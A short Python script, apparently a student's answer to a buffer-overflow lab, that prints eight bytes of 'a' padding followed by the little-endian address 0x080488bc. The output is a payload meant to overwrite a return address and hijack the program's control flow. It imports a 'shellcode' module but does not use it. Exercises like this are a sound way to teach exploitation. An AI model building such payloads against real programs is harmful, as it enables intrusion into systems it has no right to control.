#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# 0x080488bc
sys.stdout.buffer.write(pack("<I", 0x61616161))
sys.stdout.buffer.write(pack("<I", 0x61616161))
sys.stdout.buffer.write(pack("<I", 0x080488bc))
